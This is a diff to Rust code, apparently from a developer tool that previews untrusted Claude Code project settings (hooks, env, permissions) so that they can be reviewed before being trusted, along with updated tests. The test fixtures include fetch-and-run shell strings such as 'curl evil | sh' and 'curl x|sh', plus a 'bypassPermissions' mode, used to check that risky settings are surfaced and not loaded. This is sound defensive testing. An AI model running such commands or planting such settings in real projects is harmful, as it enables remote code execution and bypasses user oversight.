@@ -167,8 +167,18 @@ fn settings_preview(bytes: &[u8]) -> Vec<(String, String)> {
         match (key.as_str(), value) {
             ("hooks", Value::Object(events)) => {
                 for (event, matchers) in events {
-                    let commands = matchers.as_array().into_iter().flatten().filter_map(|m| m.get("hooks")).filter_map(Value::as_array).flatten();
-                    out.extend(commands.map(|hook| (format!("hook {event}"), hook.get("command").map_or_else(|| hook.to_string(), text))));
+                    let label = format!("hook {event}");
+                    // Anything that is not the usual `[{matcher, hooks: [{command}]}]` is shown whole.
+                    let Some(list) = matchers.as_array() else {
+                        out.push((label, matchers.to_string()));
+                        continue;
+                    };
+                    for matcher in list {
+                        match matcher.get("hooks").and_then(Value::as_array) {
+                            Some(hooks) => out.extend(hooks.iter().map(|hook| (label.clone(), hook.get("command").map_or_else(|| hook.to_string(), text)))),
+                            None => out.push((label.clone(), matcher.to_string())),
+                        }
+                    }
                 }
             }
             ("env", Value::Object(env)) => out.extend(env.iter().map(|(k, v)| ("env".to_string(), format!("{k}={}", text(v))))),
@@ -295,10 +305,6 @@ impl Hooks {
         let settings_trusted = places.user.as_deref().is_some_and(|user| claude_settings_trusted(user, &places.project));
         if !settings_trusted {
             hooks.untrusted_settings = claude_settings_preview(&places.project);
-            let remembered = places.user.as_deref().is_some_and(|user| is_trusted(user, &places.project));
-            if remembered && !hooks.untrusted_settings.is_empty() {
-                hooks.problems.push("project .claude/settings.json is not trusted (new or changed since you trusted it), so Claude Code does not load it; review it with /hooks and run /hooks trust".into());
-            }
         }
         hooks
     }
@@ -671,18 +677,19 @@ mod tests {
         assert!(has("hook PreToolUse", "touch x") && has("apiKeyHelper", "curl evil | sh") && has("env", "A=1"));
         assert!(has("permissions.allow", r#"["Bash(curl:*)"]"#) && has("permissions.defaultMode", r#""bypassPermissions""#), "{preview:?}");
         assert!(preview.iter().any(|(w, v)| w == "fileSuggestion" && v.contains("curl x|sh")), "{preview:?}");
+        assert!(settings_preview(br#"{"hooks":{"Stop":{"command":"odd"},"Pre":[{"command":"direct"}]}}"#).iter().all(|(w, v)| w.starts_with("hook ") && (v.contains("odd") || v.contains("direct"))));
         // Never trusted: nothing is loaded, and the contents are there to read with /hooks.
         let never = Hooks::load(&Places { project: project.clone(), user: Some(user.clone()) });
         assert_eq!(never.untrusted_settings().len(), preview.len());
         assert!(crate::ext::view::hooks_text(&never, crate::uifmt::Style::off()).contains("curl x|sh"));
-        // A trusted path with a settings file that was never trusted is said out loud.
+        // A remembered path with a settings file that was never trusted is not loaded either.
         std::fs::create_dir_all(&user).unwrap();
         std::fs::write(trusted_file(&user), format!("{}\n", project.display())).unwrap();
         let loaded = Hooks::load(&Places { project: project.clone(), user: Some(user.clone()) });
-        assert!(loaded.problems.iter().any(|p| p.contains(".claude/settings.json is not trusted")), "{:?}", loaded.problems);
+        assert!(!loaded.untrusted_settings().is_empty());
         assert!(trust_project(&user, &project).unwrap());
         let loaded = Hooks::load(&Places { project, user: Some(user) });
-        assert!(loaded.problems.is_empty(), "{:?}", loaded.problems);
+        assert!(loaded.untrusted_settings().is_empty());
     }
 
     #[test]
